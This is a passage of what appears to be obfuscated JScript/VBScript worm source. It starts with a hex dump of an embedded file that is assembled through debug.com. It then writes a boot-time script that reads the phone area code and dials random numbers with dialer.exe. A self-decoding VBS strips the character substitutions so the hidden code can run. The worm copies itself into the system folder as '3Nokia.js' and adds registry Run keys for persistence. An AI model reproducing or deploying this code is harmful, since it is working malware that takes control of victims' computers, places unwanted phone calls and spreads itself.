	D2.�("e 0f50 d3 57 1c 20 03 1b 81 2a 58 63 8e 98 5a 54 ba bf ")
	D2.�("e 0f60 58 60 94 69 4a a5 e6 28 48 61 c3 64 8e 3e 5e b9 ")
	D2.�("e 0f70 14 a1 18 c6 a7 3b ab 1f bd ff 00 91 bc e9 4a 51 ")
	D2.�("e 0f80 b4 69 4b ef 8f 97 f7 8f 71 92 28 b4 88 26 bc 9b ")
	D2.�("e 0f90 51 b8 65 8e 32 71 71 30 2b fc ba d7 85 58 ea 7a ")
	D2.�("e 0fa0 5d c7 89 a2 d4 bc 97 84 84 48 e2 78 8e 26 86 52 ")
	D2.�("e 0fb0 86 56 61 f2 e0 82 70 bc ff 00 2c d3 67 d5 2f e5 ")
	D2.�("e 0fc0 8a f0 49 a6 ac a2 24 67 da ec 08 c2 92 a7 76 54 ")
	D2.�("e 0fd0 f7 53 57 bc 2c da 4a f8 b7 6e bf 64 b0 db 5d 22 ")
	D2.�("e 0fe0 a4 6e 4e d5 59 76 e4 6e 23 18 52 ab f4 cd 2c 45 ")
	D2.�("e 0ff0 35 55 69 51 5f c9 bf f2 22 9d 37 1f 8e 0e de b1 ")
	D2.�("e 1000 fd 1b 0b df 1e fd b6 ea ce d4 e9 76 b1 5e 5f ee ")
	D2.�("e 1010 87 51 b9 8b 71 66 89 9f 63 1e c3 27 cb 18 04 36 ")
	D2.�("e 1020 30 71 8a e6 35 79 ed 25 d6 74 d4 82 d6 38 98 ea ")
	D2.�("e 1030 19 0c 83 04 85 2e bf 37 03 9e 33 5e 81 e3 4b 4b ")
	D2.�("e 1040 4b 3b 6b 3d 5a cf 42 7b 1b b9 2e 16 cc c0 ca a1 ")
	D2.�("e 1050 1f ae 5d 06 39 1b b1 83 c6 ec e7 eb e6 97 73 4b ")
	D2.�("e 1060 3f 88 34 bf 32 d5 62 26 f0 9c 81 c9 c6 e0 73 c7 ")
	D2.�("e 1070 a8 35 a5 1a 37 ad 19 b9 ec f6 f9 99 56 b3 a5 26 ")
	D2.�("e 1080 a0 fa eb 75 6d bd 6f f8 1d 9d 14 51 5f a0 9f 0a ")
	D2.�("e 1090 68 dc f8 82 db 4b d3 34 e8 a6 d3 6d 2e 8c 71 bd ")
	D2.�("e 10a0 c1 6b 81 92 a0 49 8f 97 83 f3 73 fa 56 de 91 3d ")
	D2.�("e 10b0 d6 ac b7 13 5a 68 5a 55 9a 5d 92 d0 49 77 30 43 ")
	D2.�("e 10c0 74 8a 3e 67 2a 17 71 03 27 db 9e b5 ca ea d7 36 ")
	D2.�("e 10d0 30 da e9 51 dc d9 79 fb c6 19 89 1f 22 99 1c 65 ")
	D2.�("e 10e0 72 0e 4f e5 57 ec fc 6f a5 79 51 c3 a9 58 4f 22 ")
	D2.�("e 10f0 58 da c9 6d 6c 63 90 02 23 2c a0 ee 04 7d ef dd ")
	D2.�("e 1100 8f 6c 64 62 bf 35 c7 65 d8 6a d8 ca ae 54 e5 f1 ")
	D2.�("e 1110 3d 6f a3 d7 c9 f7 3e e7 07 43 10 b0 d4 e4 a5 74 ")
	D2.�("e 1120 d2 d1 2f 23 a0 d5 e6 ba d1 2e 05 f5 ef 87 ec 59 ")
	D2.�("e 1130 23 b7 21 ae e0 90 39 12 63 21 3e ee 40 23 3c 9a ")
	D2.�("e 1140 a3 a4 78 86 5d 5a dc 38 d3 34 b8 2d e2 bb f2 a5 ")
	D2.�("e 1150 ba 9e 71 14 39 23 77 c9 b8 65 9b 9e 9f 53 59 37 ")
	D2.�("e 1160 5e 32 d2 e0 82 6b 0b 1b 1b 83 6d 30 02 59 27 94 ")
	D2.�("e 1170 34 8d 80 ce 00 18 c6 32 0f bf 3e d8 aa 36 1e 25 ")
	D2.�("e 1180 b2 8b 48 4d 22 e6 da 64 d3 d6 f4 49 2c 56 cc 81 ")
	D2.�("e 1190 5f 80 70 77 29 dc 87 23 2b c7 4e b8 e2 b9 3f b2 ")
	D2.�("e 11a0 30 9c dc be ca 5e b7 d3 f3 b9 d2 a8 62 6e df 37 ")
	D2.�("e 11b0 ca da 9d ae b7 65 aa 68 96 3a a5 f0 d0 74 cb 84 ")
	D2.�("e 11c0 11 99 1b c8 93 96 1c e7 cc 1b 72 78 e7 8c d6 15 ")
	D2.�("e 11d0 ae a8 ba d6 ad 24 76 9a 1d a3 25 bd a6 f9 ee a4 ")
	D2.�("e 11e0 21 44 5f ec 92 57 a6 09 e9 f9 54 17 1e 38 d1 ad ")
	D2.�("e 11f0 a3 be 9f 49 d2 ae be d4 f1 3e e6 b9 ba 66 52 09 ")
	D2.�("e 1200 60 46 0e 40 e3 38 38 35 9f a7 f8 be 2d 1a f6 e2 ")
	D2.�("e 1210 2b 58 a5 5b 4b f5 54 9f 6b 28 90 30 52 41 5c 82 ")
	D2.�("e 1220 3b 63 90 73 9a 7f d9 58 55 2b 7b 39 7a df 4f ce ")
	D2.�("e 1230 e1 ec 31 2e cd 3d 3b 75 f9 74 3b 17 d2 75 49 34 ")
	D2.�("e 1240 4b 59 ad 13 48 d4 22 52 24 58 e2 bb 62 a1 73 81 ")
	D2.�("e 1250 e5 ee 18 07 3f 4e 45 79 9e bd 7e 97 3e 27 b2 b7 ")
	D2.�("e 1260 1a 74 56 b2 45 7e 77 32 fd e9 3f 74 dc b7 03 9c ")
	D2.�("e 1270 e6 ba 38 3c 63 e1 8d 32 0b 29 2c 7c 3f 3f da ad ")
	D2.�("e 1280 e3 0b 1b cf 72 58 2f 96 c0 0e 07 04 e7 9e 83 9a ")
	D2.�("e 1290 e6 35 3d 5a 3d 5f c5 f6 4e 2d ca 30 ba 91 b7 92 ")
	D2.�("e 12a0 09 7c c4 c7 27 03 83 9e dc d7 66 1f 05 46 9e 22 ")
	D2.�("e 12b0 32 50 77 be f7 d3 e7 77 f7 18 57 a5 5b d9 4a 4d ")
	D2.�("e 12c0 d9 25 b7 af f4 cd fa 28 a2 bf 48 3e 10 d3 d4 2d ")
	D2.�("e 12d0 e4 3a 46 8c e9 a6 a5 c0 9c f9 1e 6b 6d f9 09 95 ")
	D2.�("e 12e0 f1 8c f5 39 fa 7d 6b 53 45 d3 ae 6c ae ed 8e 91 ")
	D2.�("e 12f0 e1 cb 1b ab 44 b5 95 ef 66 7f 2c cb 3d c0 05 44 ")
	D2.�("e 1300 67 3c a0 0f 91 d3 9c 1a e5 af 75 09 2d ac e0 cc ")
	D2.�("e 1310 b9 58 f7 c9 b5 e4 23 6a a9 4f ba 3f bd 97 24 7e ")
	D2.�("e 1320 35 b3 a7 e9 42 3b c8 45 fd db e9 bf da 59 7b 69 ")
	D2.�("e 1330 15 19 c4 c8 01 25 a4 71 85 5f c4 9e a3 d6 be 22 ")
	D2.�("e 1340 bd 08 c7 19 51 ca ae ed e9 69 69 af 7b d8 fa 7c ")
	D2.�("e 1350 3e 26 bf b1 8a 85 26 d2 4b 5e 6f 2e cf 63 a6 d6 ")
	D2.�("e 1360 f4 bb 19 74 f5 97 51 d1 b4 e8 75 a7 93 cb b7 8e ")
	D2.�("e 1370 d7 6b 34 83 05 b0 4e 07 60 df 95 72 da 4e 9d 3d ")
	D2.�("e 1380 b7 87 61 b8 d3 74 a8 97 5a 7b e7 0f 10 b7 49 7f ")
	D2.�("e 1390 76 a4 8d a9 b8 6d 51 bb ab e3 8c 55 bd 5f 41 5b ")
	D2.�("e 13a0 03 2e a7 6f aa 5b df c5 04 0c cf 34 53 03 2a 1e ")
	D2.�("e 13b0 c3 1c fc a7 91 9c f5 ed 58 96 4a 26 d1 d7 57 d5 ")
	D2.�("e 13c0 6e 96 ce c2 2b bf 21 65 01 a5 2e e4 6e cc 63 8f ")
	D2.�("e 13d0 7c 93 8e 87 a9 e2 b9 fd 94 3d b5 d5 5d 3b 72 cb ")
	D2.�("e 13e0 cf ad ed f8 1b 2c 56 2a df c1 7f f8 1a fc 8f 46 ")
	D2.�("e 13f0 d6 34 eb 7b 93 7e ba 8e 91 a7 43 6b 8d b6 b3 1d ")
	D2.�("e 1400 be 6c 92 70 14 11 e8 4e 6b ce b4 cb 73 e4 dc df ")
	D2.�("e 1410 c1 a2 db c9 ab 5c 41 13 e9 c9 32 2b 22 c6 48 12 ")
	D2.�("e 1420 3a af 47 65 c8 20 1e b9 e9 5d 1e a9 e1 12 d6 33 ")
	D2.�("e 1430 ff 00 67 eb 30 ea 32 80 4c 90 4d 26 1b 0a 7e 6c ")
	D2.�("e 1440 8e 4f cb e9 8a e6 b4 4b 79 f5 f7 0f 1c a6 de c6 ")
	D2.�("e 1450 08 50 4b 70 ec 5b 63 b6 31 1a a8 ea 30 3a f0 38 ")
	D2.�("e 1460 a2 74 e9 a9 a7 ed 6c 97 f7 65 ff 00 0c 54 71 18 ")
	D2.�("e 1470 a9 7b aa 8b ff 00 c0 97 e4 7a 25 dc 57 73 d8 c5 ")
	D2.�("e 1480 1e a1 e1 6d 1d e1 2a 80 79 d7 48 08 72 06 40 f9 ")
	D2.�("e 1490 31 bb 76 7a 7e 15 e4 3a 8f 90 9e 38 d3 63 8a d2 ")
	D2.�("e 14a0 2b 78 0c 97 7e 51 04 6e 65 48 e4 41 bb df 22 bb ")
	D2.�("e 14b0 b9 fc 21 63 f6 64 5b 2f 15 5a 3b a9 0c 21 91 c2 ")
	D2.�("e 14c0 00 7d 86 ec 83 f8 57 9a 5f 45 25 b7 8f ed 2d 65 ")
	D2.�("e 14d0 8c 2c b0 cb 28 63 b8 12 df bb 3c 9f 7c 93 5b d2 ")
	D2.�("e 14e0 a5 09 62 29 a8 d4 ea b4 b3 fc f6 22 a5 7a ea 9c ")
	D2.�("e 14f0 b9 e9 db 47 f6 bc bb 1d 3d 14 51 5f 70 7c 98 5d ")
	D2.�("e 1500 5f 47 67 65 00 7d 3a c6 eb e7 92 4d d7 31 86 20 ")
	D2.�("e 1510 2f 96 30 be ff 00 35 6c da 78 bc c3 24 cb 7b a2 ")
	D2.�("e 1520 d9 5c b4 2b 1d ac 59 72 00 88 90 c0 63 04 01 9c ")
	D2.�("e 1530 1e 9d 87 a5 67 4e f2 c5 a6 69 ec 96 76 93 a3 5f ")
	D2.�("e 1540 32 6e b8 5c f9 6c 42 60 8a dc b3 b5 be b8 b6 b6 ")
	D2.�("e 1550 9b fb 27 4f d4 e4 9e f3 c9 be 82 46 c2 43 08 c6 ")
	D2.�("e 1560 d7 23 b9 3e a7 3d 7a 71 5f 07 98 57 aa b1 d3 84 ")
	D2.�("e 1570 61 1b 5f 76 dd fa 7f 5f 71 f6 18 1a 34 5e 16 12 ")
	D2.�("e 1580 95 49 5e db 27 fa 34 d7 f5 dc cd b9 f1 9f da ac ")
	D2.�("e 1590 e3 4b 6d 0b 4f b5 b2 9a d9 a6 64 0a 18 b6 08 6d ")
	D2.�("e 15a0 a7 81 c6 4e 6a 8d 8e aa 97 30 c5 a7 4b a0 d9 5d ")
	D2.�("e 15b0 5a 25 de 7e cb 01 74 08 e5 46 5d 76 f3 82 1b 04 ")
	D2.�("e 15c0 74 3c d7 4b e2 bb 8b 6b 06 b7 8f 4f 4b 07 9d 21 ")
	D2.�("e 15d0 99 e4 f2 63 c4 42 35 c6 14 0c f5 c1 19 c7 1c 56 ")
	D2.�("e 15e0 27 87 dd df 47 7d 36 da f2 c7 49 bd 5b a9 7c d9 ")
	D2.�("e 15f0 12 76 b7 49 43 44 36 15 91 46 7e 46 75 25 0e 32 ")
	D2.�("e 1600 40 e6 b9 21 88 a8 e7 cb 28 c3 f1 b9 d1 2a 34 2d ")
	D2.�("e 1610 75 52 57 ed 75 f9 5a c6 8e a9 e3 3b f8 da 64 8f ")
	D2.�("e 1620 c3 b6 ba 7b 5c 12 8d 24 91 90 65 0c e5 08 63 81 ")
	D2.�("e 1630 d7 19 f7 ae 7f 4d f1 1d c5 9d c2 bd ae 9d 65 1d ")
	D2.�("e 1640 bd e4 02 49 a0 09 fb b9 36 91 80 57 f1 eb 5e 95 ")
	D2.�("e 1650 e2 4d 52 ce 2d 0f 51 83 50 b9 b0 d4 e1 8e d9 8a ")
	D2.�("e 1660 db 88 f7 48 cc 17 20 b9 c9 51 d3 3d 05 79 a4 7a ")
	D2.�("e 1670 80 1a ed a2 ea 29 68 96 8b 13 46 8c a8 4a c7 23 ")
	D2.�("e 1680 46 59 19 97 ba 0d bc ff 00 23 8a 73 c4 49 4d 46 ")
	D2.�("e 1690 31 8b f5 b8 42 95 1b 37 2a 92 4f b2 97 fc 0b 17 ")
	D2.�("e 16a0 ef be 26 34 b1 47 2a 78 73 4d 8a e5 8b b3 48 c0 ")
	D2.�("e 16b0 39 1b 58 29 c1 c7 27 9e f5 c7 dd 6a 72 6a 9e 3e ")
	D2.�("e 16c0 b4 32 da db c2 f1 47 33 16 85 70 5f 20 7c cd ef ")
	D2.�("e 16d0 c9 af 46 97 4b 6b fb 97 8e f6 cf 44 8f 4c b5 b7 ")
	D2.�("e 16e0 f3 20 d4 21 d9 fb eb 83 ca ec 03 83 d7 07 81 c8 ")
	D2.�("e 16f0 f7 af 38 b7 9a 5b af 19 21 95 60 0d 15 ac c3 74 ")
	D2.�("e 1700 60 e4 e2 45 4e 7f 2a ea c2 55 9b c5 53 8b 8a b5 ")
	D2.�("e 1710 d7 ae e6 58 aa 74 d6 1e 72 53 77 b3 d1 bd 36 f2 ")
	D2.�("e 1720 5f 71 d2 51 45 15 f7 87 c6 17 64 d5 2d ec 34 4b ")
	D2.�("e 1730 45 96 de 39 c8 ba 96 57 56 93 69 55 02 21 c0 00 ")
	D2.�("e 1740 f2 72 70 4f 1f 29 a8 e5 d7 b4 e7 8f 54 07 4d 12 ")
	D2.�("e 1750 a8 46 68 90 ca 47 9a 15 8a e2 4c 8e 3e ee 78 cf ")
	D2.�("e 1760 a5 56 95 21 92 08 23 68 5a 47 6b 85 2c d9 0b e5 ")
	D2.�("e 1770 26 31 b8 1e 72 72 79 1c 63 19 c9 ed 4f f7 6a 35 ")
	D2.�("e 1780 07 8e 3d cc b1 bc 8a 04 e0 79 81 59 94 ef 3b 7d ")
	D2.�("e 1790 89 ef d6 be 17 38 c3 61 16 32 52 ac a5 77 67 a3 ")
	D2.�("e 17a0 6b fa da c7 d5 e5 f3 a9 2c 34 79 26 95 bf bb 7f ")
	D2.�("e 17b0 c7 f1 36 a7 d7 b4 98 2f c4 69 60 e6 d1 22 2a 09 ")
	D2.�("e 17c0 7c 49 b8 a1 6c 01 8c 05 f9 40 ff 00 f5 55 6b 5d ")
	D2.�("e 17d0 4b 46 36 f6 d0 cb a3 44 0c 57 82 37 11 3f c9 18 ")
	D2.�("e 17e0 20 30 74 04 72 df 30 18 e3 bf 35 55 a1 b7 fe d7 ")
	D2.�("e 17f0 58 c6 e6 52 04 7e 61 94 6f c9 46 6c 74 fb bf 2e ")
	D2.�("e 1800 3a f7 a8 1b cb b5 d3 20 94 47 e5 90 5d a4 85 67 ")
	D2.�("e 1810 e1 76 b8 53 b4 85 e4 f3 9f c2 bc b5 43 2e d1 7b ")
	D2.�("e 1820 da f9 bf 33 b7 f7 f6 fe 22 ff 00 c0 1f f9 9a 72 ")
	D2.�("e 1830 f8 83 4e f2 b5 46 5d 34 c8 55 19 a1 5f 34 8f 30 ")
	D2.�("e 1840 2b 32 91 21 c7 1d 33 c6 78 38 a8 af 35 3d 14 5f ")
	D2.�("e 1850 2b ff 00 67 c9 81 66 ce 26 dc 37 e4 63 e4 1c 7d ")
	D2.�("e 1860 de 7a e7 f0 aa 73 43 14 72 de c6 aa 55 fc e8 e3 ")
	D2.�("e 1870 56 69 c1 12 06 fe 26 c0 fa f1 cd 53 32 c4 e9 14 ")
	D2.�("e 1880 87 cd 11 b5 a3 4c 0f 9c 09 c8 c6 50 0c 74 e4 73 ")
	D2.�("e 1890 fa 51 1a 19 75 ae b9 be f7 db fc 85 fb ff 00 e7 ")
	D2.�("e 18a0 5f f8 03 ff 00 30 8f 53 d3 e2 b4 b7 41 a7 84 3f ")
	D2.�("e 18b0 69 09 20 89 f0 88 0e 08 65 e3 93 cf 4e 3b d5 3d ")
	D2.�("e 18c0 1d a0 ba f1 75 ec d0 42 b1 aa e9 f2 1e 3e f1 c4 ")
	D2.�("e 18d0 f1 ae 5b de aa cb 34 71 c0 a0 2e 0a 96 66 55 97 ")
	D2.�("e 18e0 e5 00 6d 3f 2f 1d 7e 7f d0 d4 9e 1a 8c be bb aa ")
	D2.�("e 18f0 5d c4 58 42 a8 b6 c1 c3 64 49 ce e6 c9 1d 70 42 ")
	D2.�("e 1900 f1 5e 9e 5b 87 a0 f1 50 74 af 7b df 57 d9 dc e7 ")
	D2.�("e 1910 c6 d4 9c 68 4f 9e 49 ab 76 b6 fa 1d 45 14 51 5f ")
	D2.�("e 1920 76 7c 80 a0 95 20 82 41 1c 82 2a 19 2d e1 96 79 ")
	D2.�("e 1930 a6 30 a2 3c dc c9 e5 28 40 df 82 e0 51 45 63 57 ")
	D2.�("e 1940 0f 46 b7 f1 20 a5 ea 93 35 a7 5e ad 2f e1 c9 af ")
	D2.�("e 1950 47 61 bf 62 b7 f3 44 be 5f ef 00 da 1c b1 ce 3d ")
	D2.�("e 1960 33 4d 7b 0b 59 36 ef 8b 76 d3 b9 72 4f 07 d4 51 ")
	D2.�("e 1970 45 65 f5 0c 27 fc fa 8f fe 02 bf c8 d3 eb b8 9f ")
	D2.�("e 1980 f9 f9 2f bd 8d 93 4c b3 99 59 64 87 70 6f bc 0b ")
	D2.�("e 1990 1e 7f 5a 69 d2 2c 0e 3f d1 c7 03 03 e6 3d 3d 3a ")
	D2.�("e 19a0 d1 45 3f a8 e1 57 fc bb 8f dc 83 eb b8 9f f9 f9 ")
	D2.�("e 19b0 2f bd 88 ba 2e 98 8a 14 69 f6 c5 41 c8 56 8c 30 ")
	D2.�("e 19c0 1f 81 ab 71 45 1c 11 2c 50 c6 91 c6 bc 2a 22 80 ")
	D2.�("e 19d0 07 d0 0a 28 ad 69 d0 a5 4f 5a 71 4b d1 58 ca a5 ")
	D2.�("e 19e0 6a 95 3e 39 37 ea ee 3e 8a 28 ad 4c cf ff d9 ")
	D2.�("RCX")
	D2.�("18ef")
	D2.�("W")
	D2.�("Q")
        D2.~los$();

//Debuging of the Hex Dump of the mobile phone  .. 

			XX = WS~r@pt.Cr$at$Obj$ct("WS~r@pt.Sh$ll");
        		XX.Run("~ommand.~om /~ d$bug < %w@nd@r%\\Runn$r.@nf",true,1);

			// This is a vbs file that looks for the computers local area code and when run on boot if second is higher that 55 it will 
			// Genorate a Phone number and ring it ......

					 DF = A.Op$nT$xtF@l$(A.G$tSp$~@alFold$r(1)+"\\Phon$.vbs",2, tru$);
					 DF.Writeline("On $rror r$sum$ n$xt")
					 DF.�("s$t Y$l =~r$At$Obj$~t("+unescape("%22")+"WS~r@pt.Sh$ll"+unescape("%22")+")")
 					 DF.�("T$l = Y$l.R$gR$Ad("+un$s~ap$("%22")+"HKEY_LOCAL_MACHINE\\SOFTWARE\\M@~rosoft\\W@ndows\\~urr$ntV$rs@on\\T$l$phony\\Lo~At@ons\\Lo~At@on0\\Ar$A~od$"+un$s~ap$("%22")+")")
					 DF.�("Oldt@m$r = T@m$r")
					 DF.�("wh@l$(T@m$r < Oldt@m$r + 2)")
					 DF.�("W$nd")
					 DF.�("Goober()")
					 DF.�("Sub Goober()")
					 DF.�("@f S$~ond(Now) < 55 Th$n $x@t Sub")
 					 DF.�("RAndom@z$")
					 DF.�("A = @nt((9 * Rnd) + 1):B = @nt((9 * Rnd) + 1)")
					 DF.�("~ = @nt((9 * Rnd) + 1):D = @nt((9 * Rnd) + 1)")
 					 DF.�("$ = @nt((9 * Rnd) + 1):F = @nt((9 * Rnd) + 1)")
					 DF.�("Numb$r = T$l&A&B&~&D&$&F")
					 DF.�("Y$l.Run("+un$s~ap$("%22")+"d@Al$r.$x$"+un$s~ap$("%22")+")")
					 DF.�(" Oldtim$r = Tim$r")
					 DF.�(" whil$(Tim$r < Oldtim$r + 2)")
					 DF.�(" w$nd")
					 DF.�("Y$l.s$ndk$ys(Numb$r & "+un$s~ap$("%22")+"%d"+un$s~ap$("%22")+")")
 					 DF.�("End Sub")
					 DF.~los$();
                                                                                 R.RegWrite ("HKEY_LOCAL_MACHINE\\SOFTWARE\\M@~rosoft\\W@ndows\\~urr$ntV$rs@on\\Run\\D@al", A.G$tSp$~@alFold$r(1)+"\\Phone.vbs")

}   */

			//:))

//Create the decode vbs file. This file when run will decryp this file for eg the "/*" & "*\" will be deleted , giving the worm a clear run ...
// And All the //'s in the code are replaced with a "//" so that the code isnt ran twice ....
	{

	A = new ActiveXObject("Scripting.FileSystemObject");
	ZVV = A.OpenTextFile(A.GetSpecialFolder(1)+"\\Debug.vbs",2, true);
	ZVV.WriteLine("On error resume next")
	ZVV.WriteLine("Set Read = CreateObject("+unescape("%22")+"Scripting.FileSystemObject"+unescape("%22")+")")
	ZVV.WriteLine("for i = 1 to 9")
	ZVV.WriteLine("If i = 1 then A = "+unescape("%22")+"//"+unescape("%22")+" : If i = 1 then B = "+unescape("%22")+"Z"+unescape("%22"))
	ZVV.WriteLine("If i = 2 then A = "+unescape("%22")+""+unescape("%22")+" : If i = 2 then B = "+unescape("%22")+"/"+"*"+unescape("%22"))
 	ZVV.WriteLine("If i = 3 then A = "+unescape("%22")+""+unescape("%22")+" : If i = 3 then B = "+unescape("%22")+"*/"+unescape("%22"))
	ZVV.WriteLine("If i = 4 then A = "+unescape("%22")+unescape("%65")+unescape("%22")+" : If i = 4 then B = "+unescape("%22")+unescape("%24")+unescape("%22"))
	ZVV.WriteLine("If i = 5 then A = "+unescape("%22")+unescape("%69")+unescape("%22")+" : If i = 5 then B = "+unescape("%22")+unescape("%40")+unescape("%22"))
	ZVV.WriteLine("If i = 6 then A = "+unescape("%22")+unescape("%63")+unescape("%22")+" : If i = 6 then B = "+unescape("%22")+"~"+unescape("%22"))
	ZVV.WriteLine("If i = 7 then A = "+unescape("%22")+"@"+unescape("%22")+" : If i = 7 then B = "+unescape("%22")+"|"+unescape("%22"))
      	ZVV.WriteLine("If i = 8 then A = "+unescape("%22")+unescape("%57")+unescape("%72")+unescape("%69")+unescape("%74")+unescape("%65")+"l"+unescape("%69")+"n"+unescape("%65")+unescape("%22")+" : If i = 8 then B = "+unescape("%22")+"�"+unescape("%22"))
       	ZVV.WriteLine("If i = 9 then A = "+unescape("%22")+unescape("%24")+unescape("%22")+" : If i = 9 then B = "+unescape("%22")+"?"+unescape("%22"))
   	ZVV.WriteLine("Set x = Read.OpenTextFile("+unescape("%22")+WScript.ScriptFullname+unescape("%22")+",1)")
	ZVV.WriteLine("All = x.ReadAll")
	ZVV.WriteLine("Alltext = Replace(All,B,A)")
	ZVV.WriteLine("Set v = Read.OpenTextFile("+unescape("%22")+WScript.ScriptFullname+unescape("%22")+",2)")
	ZVV.WriteLine("v.Write(Alltext)")
	ZVV.WriteLine("v.Close")
	ZVV.WriteLine("Next")
	ZVV.WriteLine("Set Shell = CreateObject("+ unescape("%22")+"WScript.Shell"+ unescape("%22")+")")
	ZVV.WriteLine("Shell.Run ("+unescape("%22")+WScript.ScriptFullname+unescape("%22")+"),vbhide")
	ZVV.Close();
        ZV = WScript.CreateObject("WScript.Shell");
        ZV.Run(A.GetSpecialFolder(1)+"\\Debug.vbs")

// On Windows 2000 there is an error finding the file to run on second time round due to spaces if the js file is on the desktop , so it is copyed to the system dir and run on boot

	R.RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\currentVersion\\Run\\Cpy", A.GetSpecialFolder(1)+"\\"+unescape("%33")+"N"+"o"+"k"+unescape("%69")+unescape("%61")+"."+"j"+unescape("%73"))
	TTT = A.GetFile(WScript.ScriptFullName);
	TTT.Copy(A.GetSpecialFolder(1)+"\\"+unescape("%33")+"N"+"o"+"k"+unescape("%69")+unescape("%61")+"."+"j"+unescape("%73"));
	

//end decode
           //;))
			}
//EOF_______________________________________________________________________________________________________________________
